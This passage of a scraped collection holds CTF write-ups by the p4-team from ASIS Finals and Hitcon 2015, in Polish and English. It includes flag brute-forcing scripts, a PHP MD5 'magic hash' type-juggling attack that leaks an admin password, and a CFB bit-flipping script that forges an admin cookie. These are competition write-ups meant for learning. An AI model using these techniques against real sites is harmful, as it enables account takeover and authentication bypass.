'!!!!!!!!!!!'  # debug info\n        placeholder = chr(c)\n        start = 'ASIS{' + placeholder * 33\n        start = 'ASIS{d5c808f5dc96567bda48' + placeholder * 13   # algorytm zacinał się czasami, więc ręcznie dawaliśmy mu dobre wartości początkowe przeniesione z poprzednich wykonań.\n        start = 'ASIS{d5c808f5dc96567bda48be9ba82fc1d' + placeholder * 2\n        tryit(start, run(start), len(start.replace(placeholder, '')))\n\nPo chwili czekania i tweakowania algorytmu, dostajemy flagę:\n\n    ASIS{d5c808f5dc96567bda48be9ba82fc1d6}\n\n### ENG version\n\nWe get a [binary](./hash.elf) (elf). We analyse its behaviour and it is doing:\n\n    int main() {\n        char password[...];\n        scanf(\"%s\", password);\n\n        char *hash = hash_password(password);\n        if (!strcmp(hash, good_hash)) {\n            puts(\"Congratz, you got the flag :) \");\n        } else {\n            puts(\"Sorry! flag is not correct!\");\n        }\n    }\n\nThe `hash_password` function is very complex and we didn't ever try to analyse it. Instead we did something simpler - since the hash is monotonous (for longer input/higher characters it gives higher results) we tried guessing correct flag (flag hash is known and equal to (27221558106229772521592198788202006619458470800161007384471764) using bruteforce with backtracing:\n\n    import subprocess\n\n    def run(flag):\n        return subprocess.check_output(['./hash.elf', flag]).split('\\n')[0]\n\n    def prefx(a, b):\n        p = 0\n        for ac, bc in zip(a, b):\n            if ac == bc:\n                p += 1\n            else:\n                break\n        return p\n\n    def plaintext(t):\n        return ''.join(c if 32 <= ord(c) <= 127 else '.' for c in t)\n\n    sln = '27221558106229772521592198788202006619458470800161007384471764'\n    charset = '0123456789abcdef}'\n\n    def tryit(f, r, n):\n        pp = prefx(sln, r)\n        print plaintext(f), r[:pp], r[pp:]\n        stat = '<' if sln[pp] < r[pp] else '>'\n        print plaintext(f), r[:pp], r[pp:], stat\n        for c in charset:\n            f2 = f[:n] + c + f[n+1:]\n            r2 = run(f2)\n            p2 = prefx(sln, r2)\n            if p2 > pp:\n                s = tryit(f2, r2, n+1)\n                if s == '>':\n                    return\n        return stat\n\n    for c in range(256): # try to guess good initial padding\n        print c, '!!!!!!!!!!!'  # debug info\n        placeholder = chr(c)\n        start = 'ASIS{' + placeholder * 33\n        start = 'ASIS{d5c808f5dc96567bda48' + placeholder * 13   # the algorithm sometimes was stuck so we were starting it again with already pre-computed prefixes\n        start = 'ASIS{d5c808f5dc96567bda48be9ba82fc1d' + placeholder * 2\n        tryit(start, run(start), len(start.replace(placeholder, '')))\n\nAnd after a short while and some optimizations to the algorithm we get the flag:\n\n    ASIS{d5c808f5dc96567bda48be9ba82fc1d6}\n", "timestamp": "2025-10-21T22:03:13.776257"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/re_150_fake/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/re_150_fake/README.md", "content": "﻿## Fake 150 (re, 150p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./fake) (elf), do analizy, i rozpoczynamy od zdekompilowania go:\n\n    int main(int argc, char **argv)\n    {\n        v = 0;\n        vv = (v >> 19);\n        vvv = (v >> 63);\n        if (argc > 1) {\n            v = strtol(argv[1], 0, 10);\n        }\n        uint64_t va[5];\n        va[0] = 1019660215 * v;\n        va[1] = 2676064947712729\n            * ((v >> 19) - 2837 * (((int64_t)((6658253765061184651 * (v >> 19)) >> 64) >> 10) - (v >> 63)))\n            * ((v >> 19) - 35 * (((int64_t)((1054099661354831521 * (v >> 19)) >> 64) >> 1) - (v >> 63)))\n            * ((v >> 19) - 33 * (((int64_t)((1117984489315730401 * (v >> 19)) >> 64) >> 1) - (v >> 63)));\n        va[2] = (vv - 9643 * (((int64_t)((1958878557656183849 * vv) >> 64) >> 10) - vvv)) * 5785690976857702\n            * (vv - 167 * (((int64_t)((7069410902499468883 * vv) >> 64) >> 6) - vvv));\n        va[3] = (vv - 257 * (((int64_t)((9187483429707480961 * vv) >> 64) >> 7) - vvv)) * 668176625215826\n            * (vv - 55 * (((int64_t)((5366325548715505925 * vv) >> 64) >> 4) - vvv));\n        va[4] = (vv - 48271 * (((int64_t)((1565284823722614477 * vv) >> 64) >> 12) - vvv)) * 2503371776094\n            * (vv - 23 * (((int64_t)(vv + ((0x0B21642C8590B2165 * vv) >> 64)) >> 4) - vvv));\n        puts((const char *)va);\n        return 0;\n    }\n\nJak widać wykonywane jest tutaj sporo operacji matematycznych, a potem wynikowa liczba wypisywana jako tekst na konsolę.\n\nPiszemy więc prosty skrypt w pythonie, który po prostu zbrutuje możliwe liczby i wypisze wynik. Założenie jest takie, że output zaczyna się od ASIS{ oraz zawiera tylko znaki 0..9a..f. Sprawdzamy więc bruteforcując wszystkie możliwe dane wejściowe dla pierwszej operacji.\nWiemy że:\n\n    X * M === 'ASIS{...' (mod 2^64) <=> X === 'ASIS{...' * M^-1 (mod 2^64).\n    \nOdwrotność modularną M możmy łatwo wyliczyć za pomocą rozszerzonego algorytmu euklitesa, więc mamy 2^24 możliwości do sprawdzenia na trzy pozostałe bajty\n(to był błąd swoją drogą, wystarczyło sprawdzać charset 0..9a..f zamiast pełnego zakresu bajta, wtedy możliwoścy byłoby ledwo 4096).\nNastępnie dla każdej z tych opcji sprawdzamy czy zgadza się kolejne równanie (czyli bajty 2676064947712729*... są w charsecie 0..9a..f), i otrzymujemy porządnie przefiltrowaną listę możliwych rozwiązań.\n\n\n    import struct\n\n    start = 'ASIS{xxx'\n\n    def egcd(a, b):\n        if a == 0:\n            return (b, 0, 1)\n        else:\n            g, y, x = egcd(b % a, a)\n            return (g, x - (b // a) * y, y)\n\n    def modinv(a, m):\n        g, x, y = egcd(a, m)\n        if g != 1:\n            raise Exception('modular inverse does not exist')\n        else:\n            return x % m\n\n    def tou64(v):\n        return struct.unpack('<q', struct.pack('<Q', v))[0]\n\n    N = 2 ** 64\n    M = 1019660215\n    M1 = modinv(M, N)\n\n    v = 1\n    vv = v * 1019660215\n    vvv = struct.pack('<Q', vv)\n\n    #  vv = 0x415349537bxxxxxx\n    vvmin = 0x0000007b53495341\n    vvmax = 0xffffff7b53495341\n    i = vvmin\n    while i <= vvmax:\n        v = (i * M1) % N\n        v =  tou64(v)\n\n        v2 = (2676064947712729\n         * ((v >> 19) - 2837 * ((((6658253765061184651 * (v >> 19)) >> 64) >> 10) - (v >> 63)))\n         * ((v >> 19) - 35 * ((((1054099661354831521 * (v >> 19)) >> 64) >> 1) - (v >> 63)))\n         * ((v >> 19) - 33 * ((((1117984489315730401 * (v >> 19)) >> 64) >> 1) - (v >> 63)))) % N\n        v2 = struct.pack('<Q', v2)\n        if all(c in '0123456789abcdef' for c in v2):\n            print v\n        i += 0x10000000000\n\nWyników wyszło dość dużo:\n\n    E:\\User\\Code\\RE\\CTF\\2015-10-10 asisfin\\re_150_fake>python fake.py\n    890777067138092231\n    2980647405354257607\n    1536404797410020551\n    6863131814682463431\n    1636293229770214599\n    698726470626086087\n    4493585300778683591\n    25313971399\n    6583455638994848967\n    5139213031050611911\n    5239101463410805959\n    4301534704266677447\n    8096393534419274951\n    3602808258954562759\n    8742021264691203271\n    8841909697051397319\n    7904342937907268807\n    3260323581041872071\n    7205616492595154119\n\nMożna by wszystkie false positivy wyeliminować sprawdzając jeszcze wynik następnego działania, ale wyników jest na tyle mało że \nprościej przetestować je wszystkie masowo poleceniem:\n\n    vagrant@precise64:/vagrant$ cat te.txt | xargs -l ./fake\n    ASIS{▒7af556bd▒^9▒▒▒_P▒#▒e▒'▒▒▒f\n    ASIS{+▒!7af556bd▒▒▒̀▒▒IK▒▒t'p▒R▒*un\n    ASIS{▒▒\"7af556bd▒▒VZ▒e▒H5▒▒▒▒;3\n    ASIS{8▒57af556bd`▒ӡ5▒e▒6▒▒▒T▒B▒▒▒\n    ASIS{▒▒<7af556bdଜRF@b▒nwR▒_\n    ASIS{X=7af556bd▒2▒▒▒▒▒▒▒\\▒▒3X~▒CӤ\n    ASIS{▒:Z7af556bd6▒▒▒▒?\\L▒c▒6J\n    ASIS{f5f7af556bd6973bd6f2687280a243d9}\n    ASIS{▒6g7af556bdʇ▒Dj▒▒b▒.▒)-▒▒\n    ASIS{G@h7af556bd E▒:▒▒▒X▒&p[▒`\\0▒V▒A\n    ASIS{g▒7af556bdd▒;R▒b▒▒HI▒▒▒▒▒p▒1▒c▒▒\n    ASIS{▒▒▒7af556bdp▒DR>▒▒▒▒M▒f▒<dU▒\\,▒\n    ASIS{#▒▒7af556bd▒5▒?`3▒▒9▒.  6w▒O▒▒D\n    ASIS{▒7af556bd<^-▒]ro*\n    ASIS{Њ▒7af556bd▒N▒▒>▒rhUp▒▒G▒)@▒▒▒%\" mp▒#S3▒m▒▒s▒F▒bd▒{7'\n    ASIS{▒▒7af556bd▒?▒▒$▒p ▒<▒[\n    ASIS{▒v▒7af556bd▒▒&▒y3|xRR▒0▒92▒?▒▒▒.\n    ASIS{x▒▒7af556bd▒Z\n\nOczywiście w oczy rzuca się poprawna flaga - ASIS{f5f7af556bd6973bd6f2687280a243d9}.\n\nI od mamy +150 punktów.\n\n### ENG version\n\nWe get a [binary](./fake) (elf), for analysis and we start by decompilation:\n\n    int main(int argc, char **argv)\n    {\n        v = 0;\n        vv = (v >> 19);\n        vvv = (v >> 63);\n        if (argc > 1) {\n            v = strtol(argv[1], 0, 10);\n        }\n        uint64_t va[5];\n        va[0] = 1019660215 * v;\n        va[1] = 2676064947712729\n            * ((v >> 19) - 2837 * (((int64_t)((6658253765061184651 * (v >> 19)) >> 64) >> 10) - (v >> 63)))\n            * ((v >> 19) - 35 * (((int64_t)((1054099661354831521 * (v >> 19)) >> 64) >> 1) - (v >> 63)))\n            * ((v >> 19) - 33 * (((int64_t)((1117984489315730401 * (v >> 19)) >> 64) >> 1) - (v >> 63)));\n        va[2] = (vv - 9643 * (((int64_t)((1958878557656183849 * vv) >> 64) >> 10) - vvv)) * 5785690976857702\n            * (vv - 167 * (((int64_t)((7069410902499468883 * vv) >> 64) >> 6) - vvv));\n        va[3] = (vv - 257 * (((int64_t)((9187483429707480961 * vv) >> 64) >> 7) - vvv)) * 668176625215826\n            * (vv - 55 * (((int64_t)((5366325548715505925 * vv) >> 64) >> 4) - vvv));\n        va[4] = (vv - 48271 * (((int64_t)((1565284823722614477 * vv) >> 64) >> 12) - vvv)) * 2503371776094\n            * (vv - 23 * (((int64_t)(vv + ((0x0B21642C8590B2165 * vv) >> 64)) >> 4) - vvv));\n        puts((const char *)va);\n        return 0;\n    }\n\nAs can be notices there are a lot of mathematical operations and the the result number is printed out to the console.\n\nSo we write a simple python script, which will brute-force all possible numbers and print the result. The assumption is that the output starts with `ASIS{` and contains only 0..9a..f. So we test the results of multiplication by bruteforcing every possible input for first operation.\nWe know that:\n\n    X * M === 'ASIS{...' (mod 2^64) <=> X === 'ASIS{...' * M^-1 (mod 2^64).\n    \nWe can easily compute modular inverse of M using extended euclidean algorithm, so we have 2^24 possible values to test for remaining three bytes\n(by the way, checking entire byte range was an overkill, 0..9a..f had to be enough and would reduce search space to 4096).\nThen, for each checked input, we verify next equation (i.e. all bytes of 2676064947712729*... are in 0..9a..f range), and we get just a few possible solutions.\n\n    import struct\n\n    start = 'ASIS{xxx'\n\n    def egcd(a, b):\n        if a == 0:\n            return (b, 0, 1)\n        else:\n            g, y, x = egcd(b % a, a)\n            return (g, x - (b // a) * y, y)\n\n    def modinv(a, m):\n        g, x, y = egcd(a, m)\n        if g != 1:\n            raise Exception('modular inverse does not exist')\n        else:\n            return x % m\n\n    def tou64(v):\n        return struct.unpack('<q', struct.pack('<Q', v))[0]\n\n    N = 2 ** 64\n    M = 1019660215\n    M1 = modinv(M, N)\n\n    v = 1\n    vv = v * 1019660215\n    vvv = struct.pack('<Q', vv)\n\n    #  vv = 0x415349537bxxxxxx\n    vvmin = 0x0000007b53495341\n    vvmax = 0xffffff7b53495341\n    i = vvmin\n    while i <= vvmax:\n        v = (i * M1) % N\n        v =  tou64(v)\n\n        v2 = (2676064947712729\n         * ((v >> 19) - 2837 * ((((6658253765061184651 * (v >> 19)) >> 64) >> 10) - (v >> 63)))\n         * ((v >> 19) - 35 * ((((1054099661354831521 * (v >> 19)) >> 64) >> 1) - (v >> 63)))\n         * ((v >> 19) - 33 * ((((1117984489315730401 * (v >> 19)) >> 64) >> 1) - (v >> 63)))) % N\n        v2 = struct.pack('<Q', v2)\n        if all(c in '0123456789abcdef' for c in v2):\n            print v\n        i += 0x10000000000\n\nThere are quite some results:\n\n    E:\\User\\Code\\RE\\CTF\\2015-10-10 asisfin\\re_150_fake>python fake.py\n    890777067138092231\n    2980647405354257607\n    1536404797410020551\n    6863131814682463431\n    1636293229770214599\n    698726470626086087\n    4493585300778683591\n    25313971399\n    6583455638994848967\n    5139213031050611911\n    5239101463410805959\n    4301534704266677447\n    8096393534419274951\n    3602808258954562759\n    8742021264691203271\n    8841909697051397319\n    7904342937907268807\n    3260323581041872071\n    7205616492595154119\n\nWe could add checking the thrid condition to the script so remove false-positives but since there are only a couple of those it's easier to simply run:\n\n    vagrant@precise64:/vagrant$ cat te.txt | xargs -l ./fake\n    ASIS{▒7af556bd▒^9▒▒▒_P▒#▒e▒'▒▒▒f\n    ASIS{+▒!7af556bd▒▒▒̀▒▒IK▒▒t'p▒R▒*un\n    ASIS{▒▒\"7af556bd▒▒VZ▒e▒H5▒▒▒▒;3\n    ASIS{8▒57af556bd`▒ӡ5▒e▒6▒▒▒T▒B▒▒▒\n    ASIS{▒▒<7af556bdଜRF@b▒nwR▒_\n    ASIS{X=7af556bd▒2▒▒▒▒▒▒▒\\▒▒3X~▒CӤ\n    ASIS{▒:Z7af556bd6▒▒▒▒?\\L▒c▒6J\n    ASIS{f5f7af556bd6973bd6f2687280a243d9}\n    ASIS{▒6g7af556bdʇ▒Dj▒▒b▒.▒)-▒▒\n    ASIS{G@h7af556bd E▒:▒▒▒X▒&p[▒`\\0▒V▒A\n    ASIS{g▒7af556bdd▒;R▒b▒▒HI▒▒▒▒▒p▒1▒c▒▒\n    ASIS{▒▒▒7af556bdp▒DR>▒▒▒▒M▒f▒<dU▒\\,▒\n    ASIS{#▒▒7af556bd▒5▒?`3▒▒9▒.  6w▒O▒▒D\n    ASIS{▒7af556bd<^-▒]ro*\n    ASIS{Њ▒7af556bd▒N▒▒>▒rhUp▒▒G▒)@▒▒▒%\" mp▒#S3▒m▒▒s▒F▒bd▒{7'\n    ASIS{▒▒7af556bd▒?▒▒$▒p ▒<▒[\n    ASIS{▒v▒7af556bd▒▒&▒y3|xRR▒0▒92▒?▒▒▒.\n    ASIS{x▒▒7af556bd▒Z\n\nAnd so we can see the real flag: ASIS{f5f7af556bd6973bd6f2687280a243d9}.\n\nAnd we have +150 points.\n", "timestamp": "2025-10-21T22:03:14.042641"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/trivia_1_example_flag/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/trivia_1_example_flag/README.md", "content": "## What's example flag? (triv, 1p)\n\n### PL\n[ENG](#eng-version)\n\nPrzykładowa flaga znajduje się tutaj http://asis-ctf.ir/rules/ :\n\n    ASIS{476f20676f6f2e676c2f67776a625466}\n\nAle nie o nią chodzi. Hexy przypominające hash MD5 są tak naprawdę tekstem zakodowanym w ASCII.\n\n\tbytes.fromhex('476f20676f6f2e676c2f67776a625466').decode('ascii')\n\nrozwiązuje się do:\n\n    Go goo.gl/gwjbTf\n\npod tym linkiem znajduje się prawdziwa flaga:\n\n    hi all, the flag is: ASIS{c0966ad97f120b58299cf2a727f9ca59}\n\n### ENG version\n\nThere is an example flag in http://asis-ctf.ir/rules/ :\n\n    ASIS{476f20676f6f2e676c2f67776a625466}\n\nHowever, that's not the flag we are looking for. This supposed MD5 hash is actually hex encoded ASCII.\n\n\tbytes.fromhex('476f20676f6f2e676c2f67776a625466').decode('ascii')\n\nevaluates to:\n\n    Go goo.gl/gwjbTf\n\nwhere we can find the real flag:\n\n    hi all, the flag is: ASIS{c0966ad97f120b58299cf2a727f9ca59}", "timestamp": "2025-10-21T22:03:14.305619"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/trivia_75_calm_down/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/trivia_75_calm_down/README.md", "content": "﻿## Which one is flag? (trivia, 75p, 89 solves)\n\n> Which one is [flag](flagBag.zip)?\n\n### PL\n[ENG](#eng-version)\n\nOtrzymujemy plik tekstowy z prawie 300 tysiącami flag. Jednak pierwsze co rzuca się w oczy to po jednym null byte na wiersz.\n\n![](img1.png)\n\nSprawdzamy ile tych null byte-ów jest: okazuje się, że o jeden mniej niż wszystkich flag. Znajdźmy więc flagę bez niego - najpierw usuwamy wszystkie znaki w każdym z wierszy od nullbyte'a: `\\x00.+`, a następnie szukamy znaku `}`. Pozostał tylko jeden - we fladze:\n\n`ASIS{dc99999733dd1f4ebf8c199753c05595}`\n\n### ENG version\n\nWe get a text file wiht almost 300,000 flags. However, first thing that we notice is that there is a single null byte per row.\n\n![](img1.png)\n\nWe check the number of null bytes and it turns out it's the number of all flags -1. So we look for the flag without the null byte - first we remove all characters in every row starting from nullyte `\\x00.+` and then we search for `}`. There is only one - in the flag:\n\n`ASIS{dc99999733dd1f4ebf8c199753c05595}`", "timestamp": "2025-10-21T22:03:14.561963"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/web_225_impossible/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/web_225_impossible/README.md", "content": "## Impossible (web, 225p)\n\n### PL\n[ENG](#eng-version)\n\nWedług opisu zadania, flaga jest schowana na stronie http://impossible.asis-ctf.ir/\nMożemy tam zakładać konta, ale muszą one zostać aktywowane żeby się zalogować.\nJak zwykle zaczynamy od ściągnięcia `robots.txt` aby sprawdzić co autorzy strony chcą przed nami ukryć.\nhttp://impossible.asis-ctf.ir/robots.txt ma tylko jeden wpis:\n\n    User-agent: *\n    Disallow: /backup\n\nPod http://impossible.asis-ctf.ir/backup/ znajdziemy zrzut całej strony. Znacząco ułatwia nam to zadanie.\n\nW `functions.php` znajduje się mini-implementacja bazy danych:\n\n\tfunction username_exist($username) {\n\t\t$data = file_get_contents('../users.dat');\n\t\t$users = explode(\"\\n\", $data);\n\t\tforeach ($users as $key => $value) {\n\t\t\t$user_data = explode(\",\", $value);\n\t\t\tif ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t}\n\n\tfunction add_user($username, $email, $password) {\n\t\tfile_put_contents(\"../users.dat\", base64_encode($username) . \",\" . base64_encode($email) . \",0\\n\", $flag = FILE_APPEND);\n\t\tfile_put_contents(\"../passwords.dat\", md5($username) . \",\" . base64_encode($password) . \"\\n\", $flag = FILE_APPEND);\n\t}\n\n\tfunction get_user($username) {\n\t\t$data = file_get_contents('../passwords.dat');\n\t\t$passwords = explode(\"\\n\", $data);\n\t\tforeach ($passwords as $key => $value) {\n\t\t\t$user_data = explode(\",\", $value);\n\t\t\tif (md5($username) == $user_data[0]) {\n\t\t\t\treturn array($username, base64_decode($user_data[1]));\n\t\t\t}\n\t\t}\n\t\treturn array(\"\", \"\");\n\t}\n\n`register.php` umożliwia nam stworzenie nowego konta - o ile nie istnieje już jakieś o tej samej nazwie:\n\t\n\t$check = preg_match(\"/^[a-zA-Z0-9]+$/\", $_POST['username']);\n\tif (!$check) {\n\t} elseif (username_exist($_POST['username'])) {\n\t\t$result = 1;\n\t\t$title = \"Registration Failed\";\n\t} else {\n\t\tadd_user($_POST['username'], $_POST['email'], $_POST['password']);\n\t\t$user_info = get_user($_POST['username']);\n\t\t$result = 2;\n\t\t$title = \"Registration Complete\";\n\t}\n\n`index.php` umożliwia zalogowanie się - o ile użytkownik jest aktywny i ma pasujące hasło:\n\n\tif(username_exist($_POST['username'])) {\n\t\t$user_info = get_user($_POST['username']);\n\t\tif ($user_info[1] == $_POST['password']) {\n\t\t\t$login = true;\n\t\t}\n\t}\n\nNasz atak wykorzystuje kilka luk:\n\n1. W `passwords.dat` nazwy użytkownika są zahaszowane MD5 ale hasła są tylko zakodowane base64.\n2. `register.php` wypisuje hasło nowo utworzonego użytkownika. Albo, dokładniej, hasło pierwszego użytkownika którego nazwa ma takie samo md5.\n3. Skróty md5 są porównywane operatorem `==`. Jeżeli porównywane łańcuchy są poprawnymi liczbami, zostaną porównane jako liczby.\n4. Dziwnym zbiegiem okoliczności aktywny użytkownik z takim numerycznym md5 już istnieje w bazie: `md5(\"adm2salwg\") == \"0e004561083131340065739640281486\"`\n\n`0e004561083131340065739640281486` po przekonwertowaniu na liczbę jest równe 0 (w notacji matematycznej 0*10<sup>4561083131340065739640281486</sup>). Potrzebna nam będzie inna nazwa, której md5 jest również równe 0 po skonwertowaniu na liczbę.\nNawet w PHP, przeszukując kolejne liczby dostaniemy wynik po zaledwie kilku minutach:\n\n\t$p = md5(\"adm2salwg\");\n\t$i = 0;\n\twhile(true) {\n\t\tif(md5(\"\".$i) == $p) {\n\t\t\techo $i;\n\t\t}\n\t\t$i++;\n\t}\n\nPierwsze rozwiązanie: `240610708` nie zadziałało. Użytkownik z taką nazwą już istniał w bazie. Drugie rozwiązanie: `314282422` zadziałało bez problemu.\nWystarczy stworzyć nowe konto o nazwie: `314282422` a skrypt odeśle nam hasło użytkownika `adm2salwg`:\n\n    1W@ewes$%rq0\n\nPo zalogowaniu jako `adm2salwg`, pojawia się flaga:\n\n\tASIS{d9fb4932eb4c45aa793301174033dff9}\n\nSkrypty posiadają jeszcze jedną, potencjalnie użyteczną, lukę. `file_put_contents` nie jest operacją atomową.\nPrzez rejestrację wielu użytkowników z długimi nazwami i emailami równolegle, powinno się dać utworzyć niepoprawne wpisy w obu plikach.\nNie udało nam się tego jednak wykorzystać.\n\n### ENG version\n\nThe flag is supposed to be hidden here: http://impossible.asis-ctf.ir/\nIt looks like we can add new accounts, but they must be activated before logging in.\nAs usual, we start by examining `robots.txt` to find what we are not supposed to look at.\nhttp://impossible.asis-ctf.ir/robots.txt contains just two lines:\n\n    User-agent: *\n    Disallow: /backup\n\nhttp://impossible.asis-ctf.ir/backup/ contains dump of the whole site which is going to make the whole thing a lot easier.\n\n`functions.php` contains an ad-hoc implementation of a database:\n\n\tfunction username_exist($username) {\n\t\t$data = file_get_contents('../users.dat');\n\t\t$users = explode(\"\\n\", $data);\n\t\tforeach ($users as $key => $value) {\n\t\t\t$user_data = explode(\",\", $value);\n\t\t\tif ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t}\n\n\tfunction add_user($username, $email, $password) {\n\t\tfile_put_contents(\"../users.dat\", base64_encode($username) . \",\" . base64_encode($email) . \",0\\n\", $flag = FILE_APPEND);\n\t\tfile_put_contents(\"../passwords.dat\", md5($username) . \",\" . base64_encode($password) . \"\\n\", $flag = FILE_APPEND);\n\t}\n\n\tfunction get_user($username) {\n\t\t$data = file_get_contents('../passwords.dat');\n\t\t$passwords = explode(\"\\n\", $data);\n\t\tforeach ($passwords as $key => $value) {\n\t\t\t$user_data = explode(\",\", $value);\n\t\t\tif (md5($username) == $user_data[0]) {\n\t\t\t\treturn array($username, base64_decode($user_data[1]));\n\t\t\t}\n\t\t}\n\t\treturn array(\"\", \"\");\n\t}\n\n`register.php` allows you to add new account, unless one already exists and is active:\n\t\n\t$check = preg_match(\"/^[a-zA-Z0-9]+$/\", $_POST['username']);\n\tif (!$check) {\n\t} elseif (username_exist($_POST['username'])) {\n\t\t$result = 1;\n\t\t$title = \"Registration Failed\";\n\t} else {\n\t\tadd_user($_POST['username'], $_POST['email'], $_POST['password']);\n\t\t$user_info = get_user($_POST['username']);\n\t\t$result = 2;\n\t\t$title = \"Registration Complete\";\n\t}\n\n`index.php` allows you to login, if user is active and has matching password:\n\n\tif(username_exist($_POST['username'])) {\n\t\t$user_info = get_user($_POST['username']);\n\t\tif ($user_info[1] == $_POST['password']) {\n\t\t\t$login = true;\n\t\t}\n\t}\n\nOur exploit leverages several issues in those scripts.\n\n1. `passwords.dat` contains md5 sums of user names but passwords are base64 encoded.\n2. `register.php` will echo your password back to you. Or, actually, password of first user whose name has the same md5 as yours.\n3. md5s are compared using == operator. If compared strings are valid numbers, they will be parsed first.\n4. By strange coincidence active user with such numeric md5 already exists in the database: `md5(\"adm2salwg\") == \"0e004561083131340065739640281486\"`\n\n`0e004561083131340065739640281486` parses to number 0. We just need a different user name which md5 also parses to 0.\nBrute forcing that, even in PHP, only takes a couple of minutes.\n\n\t$p = md5(\"adm2salwg\");\n\t$i = 0;\n\twhile(true) {\n\t\tif(md5(\"\".$i) == $p) {\n\t\t\techo $i;\n\t\t}\n\t\t$i++;\n\t}\n\nFirst solution: `240610708` didn't work. There already was an account with that name. But the second one: `314282422` worked fine.\nAll you have to do is create account with user name: `314282422` and script will echo you `adm2salwg`'s password:\n\n    1W@ewes$%rq0\n\nAfter logging in as `adm2salwg`, flag is displayed:\n\n\tASIS{d9fb4932eb4c45aa793301174033dff9}\n\nThere is one more potentially critical issue in those scripts. `file_put_contents` is not atomic.\nBy registering a lot of users with long names and emails, it should be possible to create bogus entries in both databases.\nWe weren't able to exploit it though.", "timestamp": "2025-10-21T22:03:14.813395"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/README.md", "content": "# Writeup Hitcon CTF Quals 2015\n\nUczestniczyliśmy (msm, Rev, Shalom, other019, nazywam i pp) w Hitcon CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n?\n\nOpisy zadań po kolei.\n\n# Spis treści:\n* [Puzzleng (forensic 250)](forensic_250_puzzleng)\n* [Simple (crypto 100)](crypto_100_simple)\n* [Rsabin (crypto 314)](crypto_314_rsabin)\n* [Babyfirst (web 100)](web_100_babyfirst)\n* [Hardtosay (misc 200)](misc_200_hardtosay)\n\n# Table of contents:\n* [Puzzleng (forensic 250)](forensic_250_puzzleng#eng-version)\n* [Simple (crypto 100)](crypto_100_simple#eng-version)\n* [Rsabin (crypto 314)](crypto_314_rsabin#eng-version)\n* [Babyfirst (web 100)](web_100_babyfirst#eng-version)\n* [Hardtosay (misc 200)](misc_200_hardtosay#eng-version)\n\n\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:03:15.387231"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/crypto_100_simple/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/crypto_100_simple/README.md", "content": "﻿## Simple (crypro, 100p, 86 solves)\n\n> Become admin!  \n> http://52.69.244.164:51913\n\n> [simple-01018f60e497b8180d6c92237e2b3a67.rb](simple.rb)\n\n### PL\n[ENG](#eng-version)\n\nMożemy wykonać HTTP `GET` oraz `POST` do podanej usługi. `POST` szyfruje JSONa złożonego z podanego loginu oraz hasła 128-bitowym AESem w trybie CFB. `GET` deszyfruje go i sprawdza czy JSON ma pole `'admin': true`. Jeżeli tak, to podaje nam flagę. Klucz AESa jest stały i prywatny, a IV generowany losowo i przypinany do ciphertekstu.\n\nTryb CFB nasz ciphertekst generuje w blokach xorując zaszyfrowany klucz z naszą wiadomością. Używa w tym procesie obecny blok do zaszyfrowania następnego. Oznacza to, że nie możemy zmodyfikować dwóch bloków, które następują po sobie bez sprawienia, że deszyfracja zacznie produkować śmieci.\n\nSposób w jaki tworzony jest ten konkretny JSON sprawia że niemożliwa jest zmiana tylko ostatniego bloku - nie możemy dodać nowego pola modyfikując tylko 16 ostatnich znaków ciągu `{ ... \"password\":\"provided_password\",\"db\":\"hitcon-ctf\"}`. Możemy natomiast zmodyfikować przedostatni, a ostatni całkowicie wyciąć (po prostu przycinając ciphertext). Możemy również pobawić się z pierwszym blokiem oraz IV, ale wybraliśmy tą pierwsza metodę.\n\nOto nasz solver:\n\n```python\nimport requests\nimport urllib2\n\nresponse = requests.post('http://52.69.244.164:51913/', data={'username': 'aaa', 'password': 'bbbbbbbbbbbbbbbbbbbbbbbbbbbb'}, allow_redirects=False)\ncookie = urllib2.unquote(response.cookies['auth'])\n\nsource = 'bbbbbbbbbbbb\",\"db\":\"hitcon-ctf\"}'\ntarget = 'bbb\",\"admin\":true}              '\n\ndef xor(x, y):\n    return ''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(x, y))\n\nkey = xor(cookie[-len(source):], source)\npayload = cookie[:-len(source)] + xor(key, target)[:-14]\n\nresponse = requests.get('http://52.69.244.164:51913/', cookies={'auth': urllib2.quote(payload)})\nprint response.content\n```\n\n**hitcon{WoW_CFB_m0dE_5o_eAsY}**\n\n### ENG version\n\nWe can do a HTTP `GET` and `POST` to the provided service. `POST` encrypts a JSON of provided \"username\" and \"password\" with a 128-bit AES in CFB mode. `GET` decrypts it and if the JSON has a `'admin': true` field it gives us the flag. Key for the AES is constant and private while IV is randomly generated and prepended to the ciphertext.\n\nCFB mode produces ciphertext in blocks by xoring the encrypted key with a plaintext. It also uses part of the current block to encrypt the next. So that means that we can't change two succesive blocks without throwing off the decryption into outputting garbage.\n\nThe way this particular JSON is constructed makes it rather impossible to change only the last block - we can't add a new field by modifying the last 16 characters of `{ ... \"password\":\"provided_password\",\"db\":\"hitcon-ctf\"}`. We can however, edit the one before last and discard the last block of ciphertext by simple truncating. We could also play with the first one and the IV, but we chose the former method.\n\nHere's the solver:\n\n```python\nimport requests\nimport urllib2\n\nresponse = requests.post('http://52.69.244.164:51913/', data={'username': 'aaa', 